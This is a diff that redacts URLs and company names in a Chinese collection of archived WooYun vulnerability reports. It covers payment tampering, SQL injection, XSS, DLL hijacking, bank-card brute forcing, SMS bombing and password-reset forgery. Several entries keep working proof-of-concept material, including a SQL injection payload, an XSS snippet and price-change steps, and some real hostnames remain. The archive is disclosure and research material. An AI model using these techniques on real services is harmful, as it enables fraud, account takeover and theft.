-**详情**: 在注册263邮箱的时候，要求去支付宝购买套餐，一个页面直接向支付宝POST支付的金额，使用FIDDLER2可以截取该数据包，同时修改金额，导致漏洞产生。漏洞页面：http://mbill.263.net/commons/paylog.do
+**详情**: 在注册263邮箱的时候，要求去某电商平台购买套餐，一个页面直接向某电商平台POST支付的金额，使用FIDDLER2可以截取该数据包，同时修改金额，导致漏洞产生。漏洞页面：https://example.com/[已脱敏]
 
-**POC**: 支付页面截取到的数据修改数据，POST支付宝支付页面流水查询支付宝支付记录
+**POC**: 支付页面截取到的数据修改数据，POST某电商平台支付页面流水查询某电商平台支付记录
 
 **绕过**: 直接利用
 
@@ -1249,9 +1249,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x0 环境介绍经过个人对墨迹天气的多次反馈与沟通，墨迹的运维大大反馈说开发哥哥们终于修复了WooYun: 墨迹天气android客户端系列2：修改任意邮箱用户密码姿势一。那我看一眼是不是真修复了。0x1 diffWooYun: 墨迹天气android客户端系列2：修改任意邮箱用户密码姿势一中找回密码的连接如下：http://ugc.moji001.com/mapi/ResetPasswordBefore?E268443E43D93DAB7EBEF303BBE9642F={{mail}}&07CC694B9B3FC636710FA08B6922C42B={{timestamp}}&lan=CH{{mail}}:即要修改密码的邮箱,编码为 hex ascii{{timstamp}}：客户端发出找回密码时的时间戳，几个小时内有效,编码为hex ascii。修复后的找回密码连接如下：http:/
+**详情**: 0x0 环境介绍经过个人对墨迹天气的多次反馈与沟通，墨迹的运维大大反馈说开发哥哥们终于修复了WooYun: 墨迹天气android客户端系列2：修改任意邮箱用户密码姿势一。那我看一眼是不是真修复了。0x1 diffWooYun: 墨迹天气android客户端系列2：修改任意邮箱用户密码姿势一中找回密码的连接如下：https://example.com/[已脱敏] hex ascii{{timstamp}}：客户端发出找回密码时的时间戳，几个小时内有效,编码为hex ascii。修复后的找回密码连接如下：http:/
 
-**POC**: 要修改B的密码，只要A邮箱用户在客户端点“忘记密码”，获取一个忘记密码连接http://ugc.moji001.com/sns/ResetPasswordBefore?E268443E43D93DAB7EBEF303BBE9642F={{mail}}&07CC694B9B3FC636710FA08B6922C42B={{timestamp}}&9941E268A0F6F8E2AA2898B5A522D23D={{mail-timestamp-moji_china}}&lan=CH。然后，将连接中的mail(两处)替换成邮箱B并用hexscii编码并且大写，即可。辗转反复，高估了墨迹程序员的补丁
+**POC**: 要修改B的密码，只要A邮箱用户在客户端点“忘记密码”，获取一个忘记密码连接https://example.com/[已脱敏])替换成邮箱B并用hexscii编码并且大写，即可。辗转反复，高估了墨迹程序员的补丁
 
 **绕过**: 编码绕过
 
@@ -1295,7 +1295,7 @@
 
 **详情**: 
 
-**POC**: <a href="https://www.google.com/csi" target="xx" onclick="setTimeout('d()', 1222);">ss</a><script>function d(){window.open("javascript:location.href='javascript:location.href=\\\'<title>aloha</title>Mmm...\\\''", "xx");}</script>
+**POC**: <a href="https://example.com/[已脱敏]" target="xx" onclick="setTimeout('d()', 1222);">ss</a><script>function d(){window.open("javascript:location.href='javascript:location.href=\\\'<title>aloha</title>Mmm...\\\''", "xx");}</script>
 
 **绕过**: 直接利用
 
@@ -1359,7 +1359,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百森水果商城1元随便吃http://www.bufsun.com参数按下图修改
+**详情**: 百森水果商城1元随便吃https://example.com/[已脱敏]
 
 **POC**: RT
 
@@ -1381,7 +1381,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://pay.lianzhong.com这个站有waf,不知道是不是坏了。本来测试看有没支付漏洞呢，可能习惯SQL了吧，直接搞起。涉及的库有支付信息&ADMIN&BBS等。POST /charge-center/ddzquery.do HTTP/1.1Host: pay.lianzhong.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Refe
+**详情**: https://example.com/[已脱敏] /charge-center/ddzquery.do HTTP/1.1Host: pay.lianzhong.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Refe
 
 **POC**: ---Parameter: orderId (POST)Type: boolean-based blindTitle: OR boolean-based blind - WHERE or HAVING clausePayload: projectName=ddz&page=1&orderById=&orderByType=&channel=&orderId=-5065' OR 2044=2044 AND 'vCvm' LIKE 'vCvm&startDate=2015-06-27&endDate=2015-07-27&startAmount=&endAmount=Type: AND/OR ti
 
@@ -1403,7 +1403,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://pc.buy.91.com  这个的问题和WooYun: 安卓网商城存在严重支付漏洞和这个一样一页是抓包改包。。安卓网应该是你们网龙的、、、
+**详情**: https://example.com/[已脱敏]  这个的问题和WooYun: 安卓网商城存在严重支付漏洞和这个一样一页是抓包改包。。安卓网应该是你们网龙的、、、
 
 **POC**: = =~
 
@@ -1413,8 +1413,8 @@
 ---
 
 ---
-### [wooyun-2012-016163] 开通超级QQ超惠生活版出现Q币支付漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 账户体系控制不严
+### [wooyun-2012-016163] 开通超级某互联网公司超惠生活版出现Q币支付漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 账户体系控制不严
 
 **元思考**: 触发信号: 功能测试
 
@@ -1447,7 +1447,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随意购买大额游戏金币。支付时用Burp Suite抓包，可以更改支付金额。漏洞网站：http://www.youmiwan.com
+**详情**: 随意购买大额游戏金币。支付时用Burp Suite抓包，可以更改支付金额。漏洞网站：https://example.com/[已脱敏]
 
 **POC**: 价格999更改为0.01
 
@@ -1469,7 +1469,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 订单处，这次不用改桔币，不用改数量，直接空手套白狼，改优惠价格！其他优惠，参数mdz_money。fiddler拦截修改，改为优惠500块。放行，真的减少了500块。。不过fiddler放行后，无法生成支付宝支付按钮，不知道什么原因。换了burpsuite之后可以支付。注意，此处的参数mdz_money，不可优惠过多，好像是根据物品价格按比例算的，买个799的优惠500块可以，优惠600就不行。。。买个500多的话，估计只能优惠个三四百。。无法实现0元购物。但每单都可以少个几百块。
+**详情**: 订单处，这次不用改桔币，不用改数量，直接空手套白狼，改优惠价格！其他优惠，参数mdz_money。fiddler拦截修改，改为优惠500块。放行，真的减少了500块。。不过fiddler放行后，无法生成某电商平台支付按钮，不知道什么原因。换了burpsuite之后可以支付。注意，此处的参数mdz_money，不可优惠过多，好像是根据物品价格按比例算的，买个799的优惠500块可以，优惠600就不行。。。买个500多的话，估计只能优惠个三四百。。无法实现0元购物。但每单都可以少个几百块。
 
 **POC**: 如上了
 
@@ -1479,8 +1479,8 @@
 ---
 
 ---
-### [wooyun-2011-03605] QQDLL加载漏洞可能导致用户密码被窃取
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-03605] 某互联网公司DLL加载漏洞可能导致用户密码被窃取
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -1491,13 +1491,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 利用了Windows加载DLL的一个特点。由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件，而不是按照指定路径加载。在Windows XP sp2以上的系统会默认开启Safe Dll Search Mode，启用了这个模式后，DLL文件的搜索顺序是：可执行程序的加载目录系统目录（即system32文件夹）16位系统目录Windows目录当前目录Path环境变量中列出的目录伪造的DLL制作好后，放到程序目录下，这样当原程序调用原函数时就会优先调用了伪造的DLL文件，进入劫持DLL的代码。该文件也提供了和系统文件一样的输出表，并最终转向真正的系统文件。Lpk.dll是系统关键文件之一，QQ启动时也要加载这个文件。在平时我们使用普通的键盘记录器记录的QQ密码是错误的，因为QQ的密码框使用了特殊的设计，保护密码安全。但是我制作了一个假冒的lpk.dll，这个文件能
+**详情**: 利用了Windows加载DLL的一个特点。由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件，而不是按照指定路径加载。在Windows XP sp2以上的系统会默认开启Safe Dll Search Mode，启用了这个模式后，DLL文件的搜索顺序是：可执行程序的加载目录系统目录（即system32文件夹）16位系统目录Windows目录当前目录Path环境变量中列出的目录伪造的DLL制作好后，放到程序目录下，这样当原程序调用原函数时就会优先调用了伪造的DLL文件，进入劫持DLL的代码。该文件也提供了和系统文件一样的输出表，并最终转向真正的系统文件。Lpk.dll是系统关键文件之一，某互联网公司启动时也要加载这个文件。在平时我们使用普通的键盘记录器记录的某互联网公司密码是错误的，因为某互联网公司的密码框使用了特殊的设计，保护密码安全。但是我制作了一个假冒的lpk.dll，这个文件能
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 微软的解释请访问http://msdn.microsoft.com/en-us/library/ff919712(VS.85).aspx(1）调用LoadLibrary，LoadLibraryEx，CreateProcess的，或者的ShellExecute等涉及到模块加载的函数的时候，指定DLL加
+**修复**: 微软的解释请访问https://example.com/[已脱敏]).aspx(1）调用LoadLibrary，LoadLibraryEx，CreateProcess的，或者的ShellExecute等涉及到模块加载的函数的时候，指定DLL加
 ---
 
 ---
@@ -1513,9 +1513,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注册是http://www.digutuan.com/member-account/register.html验证码没有进行验证~~无论输入什么都能注册~~就不截图了支付在http://www.digutuan.com/deal-1316.html把数量修改成负值这里想问一句~~银行的转账支出会用负值表示，还是会用支付类型加上正值的金额表示呢应该是后者~~~由于负值在银行接口里无法通过（这里就不截图了）所以再买多几样东西~~（本来想买少点的~被逼的）大家合理搭配~~看着点~~让厂商挣一点~~反正付多少你们控制~~好了~~大家屯年货去吧~~
+**详情**: 注册是https://example.com/[已脱敏]
 
-**POC**: 注册是http://www.digutuan.com/member-account/register.html验证码没有进行验证~~无论输入什么都能注册~~就不截图了支付在http://www.digutuan.com/deal-1316.html把数量修改成负值这里想问一句~~银行的转账支出会用负值表示，还是会用支付类型加上正值的金额表示呢应该是后者~~~由于负值在银行接口里无法通过（这里就不截图了）所以再买多几样东西~~（本来想买少点的~被逼的）大家合理搭配~~看着点~~让厂商挣一点~~反正付多少你们控制~~
+**POC**: 注册是https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1535,7 +1535,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.不用说了，是主站啊，看这里http://www.dianwoba.com2.去餐厅看看呢，选必胜客吧，哥们到现在都没去过呢！土比啊http://www.dianwoba.com/dianwoba/grid/liansuo.jsp?lid=223.点两份披萨，送我基友@neal一份，这娃子好久没来乌云了，有点想念了！这里两份一个118，外加10元的跑路费！
+**详情**: 1.不用说了，是主站啊，看这里https://example.com/[已脱敏]
 
 **POC**: 4.点击提交订单，抓包看下post的数据fun=addOrder&addrid=118501&qukuai=C&contact=昆汀&addrs=的顶顶顶顶顶顶顶顶顶顶&phone=13812344321&receiveTime=2012-09-11 11:15&menu_list=180010|1;180013|1;&menu_list2=意式鲜香腊肉肠披萨|1;香酥罗非鱼披萨|1;&menuPrice=118&runnerPrice=10&totalAmount=2&remarks=无&supid=180&sexvalue=1&arrivetime=2012-09-11 11:15&pa
 
@@ -1559,7 +1559,7 @@
 
 **详情**: 从很久以前就发现，WPS有一个很令人讨厌的功能，那就是每次打开和关闭WPS时，它总会自动启动自带的wpsupdate.exe（自动更新）和wpsnotify.exe（弹窗广告），就算在WPS配置工具里关闭了自动更新功能，它还是会自动启动。测试后发现，WPS启动时并没有验证那俩程序的真实性，虽然有数字签名，但是普通用户有几个会注意到呢？所以如果构造一个同名恶意软件并替换它们，那么在windows7等系统下运行WPS时，就算触发了UAC提示，也极易诱导用户手动过UAC执行假冒的恶意程序。而且，WPS默认安装目录不受UAC保护，文件被非法替换时不会触发UAC提示。测试系统：Windows7 32位中文旗舰版，WPS office 2013个人版官方最新安装包。安装包数字签名图漏洞演示说明：运行自制的漏洞验证程序，作用是把原wpsupdate.exe替换成我仿造的wpsupdate.exe，并启动
 
-**POC**: 演示视频下载地址http://pan.baidu.com/s/1s8Xm2，提取码：up8m，解压密码：wpspoc123。
+**POC**: 演示视频下载地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1579,7 +1579,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 后门同WooYun: 齐博CMS整站系统最新版依然存在后门后门存在于 博客系统 下载系统 考试系统 黄页系统 新闻媒体系统 图片系统 视频系统 知道系统漏洞文件为inc/splitword.php  CRC32   ：C6B4B212文件采用威盾加密 解密后代码见：http://blog.99tk.cn/wp-content/uploads/2015/02/20150208-130909-585.txt解密后在 101行发现后门详情见漏洞证明
+**详情**: 后门同WooYun: 齐博CMS整站系统最新版依然存在后门后门存在于 博客系统 下载系统 考试系统 黄页系统 新闻媒体系统 图片系统 视频系统 知道系统漏洞文件为inc/splitword.php  CRC32   ：C6B4B212文件采用威盾加密 解密后代码见：https://example.com/[已脱敏] 101行发现后门详情见漏洞证明
 
 **POC**: 博客系统：下载系统:考试系统:黄页系统 :新闻媒体系统:图片系统:视频系统:知道系统 :以博客系统为例：
 
@@ -1655,8 +1655,8 @@
 ---
 
 ---
-### [wooyun-2012-09436] 免费使用腾讯离线下载业务下载超大文件
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-09436] 免费使用某互联网公司离线下载业务下载超大文件
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -1667,13 +1667,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 非会员是无法使用QQ离线下载业务的，但是登陆lixian.qq.com后会让你试用，这个试用的规则是：试用90天，容量为3G。这个要求其实已经可以满足大部分人的临时需求了，但是如果超过3G呢？离线下载会提示我们空间不足，恰巧今天想下载一个大文件（4.1G），看了下离线下载的逻辑，发现点小问题，可以突破这个3G空间大小的限制！
+**详情**: 非会员是无法使用某互联网公司离线下载业务的，但是登陆lixian.某互联网公司.com后会让你试用，这个试用的规则是：试用90天，容量为3G。这个要求其实已经可以满足大部分人的临时需求了，但是如果超过3G呢？离线下载会提示我们空间不足，恰巧今天想下载一个大文件（4.1G），看了下离线下载的逻辑，发现点小问题，可以突破这个3G空间大小的限制！
 
-**POC**: 利用方式：1，首先添加这个大文件的种子，有两个文件，其中一个相对小点，可以直接添加，我们先加这个小文件的离线，前面两个包不去考虑，因为尝试修改大小并未成功，而且这个种子的hash不知是如何计算的。主要看第三个包POST /handler/lixian/get_http_url.php HTTP/1.1Host: lixian.qq.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0Accept: application/json, text/javasc
+**POC**: 利用方式：1，首先添加这个大文件的种子，有两个文件，其中一个相对小点，可以直接添加，我们先加这个小文件的离线，前面两个包不去考虑，因为尝试修改大小并未成功，而且这个种子的hash不知是如何计算的。主要看第三个包POST /handler/lixian/get_http_url.php HTTP/1.1Host: lixian.某互联网公司.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0Accept: application/json, text/javasc
 
 **绕过**: 直接利用
 
-**修复**: 最近有个龙泽洛拉什么的，大家懂。PS：并不是什么安全BUG，腾讯自己瞧着办吧。
+**修复**: 最近有个龙泽洛拉什么的，大家懂。PS：并不是什么安全BUG，某互联网公司自己瞧着办吧。
 ---
 
 ---
@@ -1777,7 +1777,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 哇，是不是如图那么漂亮的妹子教呀？下单操作时可以修改价格，导致几千元的培训1元任意购买POST /index.php?g=course&m=pcindex&a=signup HTTP/1.1Host: zixun.baihe.comProxy-Connection: keep-aliveContent-Length: 83Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://zixun.baihe.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/53
+**详情**: 哇，是不是如图那么漂亮的妹子教呀？下单操作时可以修改价格，导致几千元的培训1元任意购买POST /index.php?g=course&m=pcindex&a=signup HTTP/1.1Host: zixun.baihe.comProxy-Connection: keep-aliveContent-Length: 83Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/53
 
 **POC**: (见原文)
 
@@ -1799,9 +1799,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某积分商城系统存在业务逻辑漏洞，可批量枚举银行卡和交易密码，早大量用户信息泄露。部分银行如下：桂林银行积分商城  https://lejifen.taccb.com.cn/jfyMall/攀枝花市商业银行积分商城  https://jf.pzhccb.com/jfyMall/济宁银行积分商城  https://jf.jn-bank.com/jfyMall/齐商银行积分商城  https://jf.qsbank.cc/jfyMall/东营银行积分商城  https://jf.dyccb.net/jfyMall/江苏邳州农村商业银行综合积分商城  https://jf.pznsh.com/jfyMall/泰安市商业银行  https://lejifen.taccb.com.cn/jfyMall/5个以上算通用了吧
+**详情**: 某积分商城系统存在业务逻辑漏洞，可批量枚举银行卡和交易密码，早大量用户信息泄露。部分银行如下：桂林银行积分商城  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]
 
-**POC**: 用户在注册过程中确认银行卡和找回用户名时，均可对银行卡和密码进行暴力枚举。通过用户注册：https://ebank.guilinbank.com.cn/jfyMall/user/register.do或找回用户名，https://ebank.guilinbank.com.cn/jfyMall/user/findnameto.do进行暴力猜解。拿用户注册来示范：用户注册共分三步：1，填写个人信息 2，确认银行卡 3，注册成功写个人信息这一步没有问题。问题出在第二步，如下图：因无桂林银行的银行卡，去网上搜索一张，得到桂林银行的银行卡如下：622856700000*****前六位应该是相同的，本次测
+**POC**: 用户在注册过程中确认银行卡和找回用户名时，均可对银行卡和密码进行暴力枚举。通过用户注册：https://example.com/[已脱敏] 2，确认银行卡 3，注册成功写个人信息这一步没有问题。问题出在第二步，如下图：因无桂林银行的银行卡，去网上搜索一张，得到桂林银行的银行卡如下：622856700000*****前六位应该是相同的，本次测
 
 **绕过**: 直接利用
 
@@ -1821,7 +1821,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.douguo.com/mall/item/401只有周五才能买的 该商品id为401我们找个能买的商品http://www.douguo.com/mall/item/184
+**详情**: https://example.com/[已脱敏] 该商品id为401我们找个能买的商品https://example.com/[已脱敏]
 
 **POC**: 将goods_id改为401 然后提交
 
@@ -1831,7 +1831,7 @@
 ---
 
 ---
-### [wooyun-2015-0147825] 轻停停车跳过支付完成订单并且成功退款到账户（刷停车费）
+### [wooyun-2015-0147825] 轻停某停车平台跳过支付完成订单并且成功退款到账户（刷某停车平台费）
 **厂商**: qtparking.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
@@ -1843,7 +1843,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 通过微信正常下单子。（通过 Burp 修改订单价格-成功下单，不多测试）2. 正常下单子，burp 可以看到支付成功后的跳转地址http://www.qtparking.com:80/weixin"+"/zhiFuSuccess?parkCode="+"XXXXXXXXXXXXXXX"+"&userOpenId="+"XXXXXXXXXXXX"+"&outTradeNo="+"XXXXXXXXXXXXXXX"3. 可以到订单里直接取消订单，套取回款。
+**详情**: 1. 通过某互联网公司正常下单子。（通过 Burp 修改订单价格-成功下单，不多测试）2. 正常下单子，burp 可以看到支付成功后的跳转地址https://example.com/[已脱敏]"+"/zhiFuSuccess?parkCode="+"XXXXXXXXXXXXXXX"+"&userOpenId="+"XXXXXXXXXXXX"+"&outTradeNo="+"XXXXXXXXXXXXXXX"3. 可以到订单里直接取消订单，套取回款。
 
 **POC**: 1. 跳过支付页面，完成订单2. 退款情况，原来有30元退款，加测试后的32元变成62元。
 
@@ -1887,7 +1887,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.网站登陆页面http://www.nx.gov.cn/member/memberSysm.htm2.找回密码页面，输入用户名3.得到密码
+**详情**: 1.网站登陆页面https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1909,7 +1909,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 可以通过正方教务管理系统的C/S客户端进行任意账号的登录操作，服务器会返回其账号极其加密后的密码，通过简单的解密即可任意登陆系统，使系统处于危险之中。具体如下所述：1、可以通过旧版的C/S客户端登陆系统，初始化界面，这个时候系统已经登陆到数据库中了。然后任意输入一个账号密码，单击登陆按钮，立即采用抓包工具抓包，可以发现系统已经向服务器发送了一个查询的SQL语句2、这时候因为随意输入的密码，所以会提示您密码输入错误！3但是....令人发指的是，抓包发现已经把账号密码发到自己的客户端上来了，截图一枚，这里的密码虽然经过加密，但是加密的方式实在是想让我唾骂一把！很简单，大家自己看着办吧！4然后，然后就没有然后了，顺手登陆上去了哦！自己的QQ 2595638858
+**详情**: 可以通过正方教务管理系统的C/S客户端进行任意账号的登录操作，服务器会返回其账号极其加密后的密码，通过简单的解密即可任意登陆系统，使系统处于危险之中。具体如下所述：1、可以通过旧版的C/S客户端登陆系统，初始化界面，这个时候系统已经登陆到数据库中了。然后任意输入一个账号密码，单击登陆按钮，立即采用抓包工具抓包，可以发现系统已经向服务器发送了一个查询的SQL语句2、这时候因为随意输入的密码，所以会提示您密码输入错误！3但是....令人发指的是，抓包发现已经把账号密码发到自己的客户端上来了，截图一枚，这里的密码虽然经过加密，但是加密的方式实在是想让我唾骂一把！很简单，大家自己看着办吧！4然后，然后就没有然后了，顺手登陆上去了哦！自己的某互联网公司 2595638858
 
 **POC**: 还需要证明吗？这个算是个正方庞大的漏洞体系中的一个小巫了吧！哈哈
 
@@ -1985,8 +1985,8 @@
 ---
 
 ---
-### [wooyun-2015-0155592] 摘除京东商城APK完整性检查模块(轻松盗版)
-**厂商**: 京东商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0155592] 摘除某电商平台商城APK完整性检查模块(轻松盗版)
+**厂商**: 某电商平台商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -1997,7 +1997,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 简要步骤1、下载京东手机端2、java -jar jartool d -d  jingdong.apk -o C:\out3、尝试打开Debuggle = true4、发生了完整性检查5、找关键点 字符串位置 调用位置等 注意 两个dex6、函数入口处return即可
+**详情**: 简要步骤1、下载某电商平台手机端2、java -jar jartool d -d  jingdong.apk -o C:\out3、尝试打开Debuggle = true4、发生了完整性检查5、找关键点 字符串位置 调用位置等 注意 两个dex6、函数入口处return即可
 
 **POC**: 成功运行。无提示。任意修改无其他限制。怎么证明呢。
 
@@ -2073,7 +2073,7 @@
 ---
 
 ---
-### [wooyun-2015-0103233] iOS URL Scheme劫持-在未越狱的iPhone 6(iOS 8.2)上盗取支付宝和微信支付的帐号密码
+### [wooyun-2015-0103233] iOS URL Scheme劫持-在未越狱的iPhone 6(iOS 8.2)上盗取某电商平台和某互联网公司支付的帐号密码
 **厂商**: 苹果 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
@@ -2085,9 +2085,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 事先声明：1、该漏洞是iOS系统漏洞，和支付宝，微信app无关。本文只是拿支付宝和微信作为演示漏洞的应用，其他应用同样可以中招，转发者请勿断章取义。2、此漏洞是另一个漏洞，和“在非越狱的iPhone 6 (iOS 8.1.3) 上进行钓鱼攻击 (盗取App Store密码)”上利用的漏洞无关，本人不会干用一个漏洞写两个文章灌水的事情。该漏洞最早是由我在FireEye的同事hui, Song jin和lenx发现的，因为该漏洞利用简单，修复却非常复杂，所以在iOS 8.2上还是未能修复。虽然iOS尚未修复，但app本身还是可以有防护的方法，本人在文章最后会提出一些应急的解决方案以供开发人员参考。
+**详情**: 事先声明：1、该漏洞是iOS系统漏洞，和某电商平台，某互联网公司app无关。本文只是拿某电商平台和某互联网公司作为演示漏洞的应用，其他应用同样可以中招，转发者请勿断章取义。2、此漏洞是另一个漏洞，和“在非越狱的iPhone 6 (iOS 8.1.3) 上进行钓鱼攻击 (盗取App Store密码)”上利用的漏洞无关，本人不会干用一个漏洞写两个文章灌水的事情。该漏洞最早是由我在FireEye的同事hui, Song jin和lenx发现的，因为该漏洞利用简单，修复却非常复杂，所以在iOS 8.2上还是未能修复。虽然iOS尚未修复，但app本身还是可以有防护的方法，本人在文章最后会提出一些应急的解决方案以供开发人员参考。
 
-**POC**: 首先来看demo:在未越狱的iPhone6(iOS 8.2)上盗取支付宝帐号密码Youtube（需翻墙）: https://www.youtube.com/watch?v=p86Kv1uHO-s腾讯视频: http://v.qq.com/page/p/d/s/p0149z3tgds.html在未越狱的iPhone6(iOS 8.2)上盗取微信支付密码Youtube（需翻墙）: https://www.youtube.com/watch?v=4SfCVGReyKI腾讯视频: http://v.qq.com/page/i/f/h/i0149uh43fh.htmlDEMO细节分析（支付宝）：在iOS
+**POC**: 首先来看demo:在未越狱的iPhone6(iOS 8.2)上盗取某电商平台帐号密码Youtube（需翻墙）: https://example.com/[已脱敏] https://example.com/[已脱敏] 8.2)上盗取某互联网公司支付密码Youtube（需翻墙）: https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2107,7 +2107,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://i.yeepay.com/shtml/mobile_01.jsp 在这个页面充值的时候可以截断数据并修改。因为没有网银，所以没继续搞。
+**详情**: https://example.com/[已脱敏] 在这个页面充值的时候可以截断数据并修改。因为没有网银，所以没继续搞。
 
 **POC**: (见原文)
 
@@ -2129,7 +2129,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发短消息的地方有这么一句：输入WooYun上的用户昵称/厂商名称所以。。。。我们注册一个和厂商名字一样的帐号，是不是就能劫持厂商的短消息了呢？于是，发了个小洞，注册了个帐号http://wooyun.org/whitehats/乌云官方和“乌云官方”同名的帐号。然后，我给“乌云官方”发短消息，结果。。。。
+**详情**: 发短消息的地方有这么一句：输入WooYun上的用户昵称/厂商名称所以。。。。我们注册一个和厂商名字一样的帐号，是不是就能劫持厂商的短消息了呢？于是，发了个小洞，注册了个帐号https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2175,7 +2175,7 @@
 
 **详情**: 1.苏宁易购会员中心，有一个手机验证功能。该功能为了方便会员绑定手机。2.手机绑定，需要先通过邮箱认证，该过程需要输入验证码进行。3.通过邮箱验证获取验证码后，可以进行手机验证，但是不限定手机号码，也不需要验证码，仅仅输入手机号，即可获取验证码，而且所谓的60秒等待再发功能是通过网页JS控制的，实际上无时间限制。4.通过抓包后再次提交进行权限验证，该手机验证码发布接口，未做任何验证，没有对提交来源，提交次数，提交号码等做出验证，通过该接口可以无限制的提交手机验证请求。通过简单的编程可以瞬间对某号码发出上千条验证码，可以简单的来制作一个“手机短信轰炸机”。
 
-**POC**: 1.在后台按照常规的验证手机号的步骤进行验证，通过邮箱验证后，可以进行手机号验证，对手机号验证过程进行抓包。2.验证完毕后，手机接到验证码，转到抓包工具中，可以看到网页端提交了2个请求。我提交了2次获取验证码，得到4条请求信息，经查看，第一条是验证号码信息是否合法的，没有意义，第二条请求是发送手机验证码的。通过POST(实际上是GET也可以)协议，提交一个请求：https://member.suning.com/emall/SNMemberCardValidCtrlCmd?cellphone=手机号&action=send&step=bindEmail没有任何来源验证，或者权限验证，也没有次数
+**POC**: 1.在后台按照常规的验证手机号的步骤进行验证，通过邮箱验证后，可以进行手机号验证，对手机号验证过程进行抓包。2.验证完毕后，手机接到验证码，转到抓包工具中，可以看到网页端提交了2个请求。我提交了2次获取验证码，得到4条请求信息，经查看，第一条是验证号码信息是否合法的，没有意义，第二条请求是发送手机验证码的。通过POST(实际上是GET也可以)协议，提交一个请求：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2228,7 +2228,7 @@
 
 ---
 ### [wooyun-2014-074623] 天翼云盘通支付逻辑漏洞(可产生负值)
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -2239,7 +2239,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ctyun.cn如图:提交订单然后我们抓包，将购买年限改成负数~~之后你懂的:
+**详情**: https://example.com/[已脱敏]
 
 **POC**: --------------------------------
 
@@ -2271,8 +2271,8 @@
 ---
 
 ---
-### [wooyun-2012-011957] 微信找回密码短信无限发
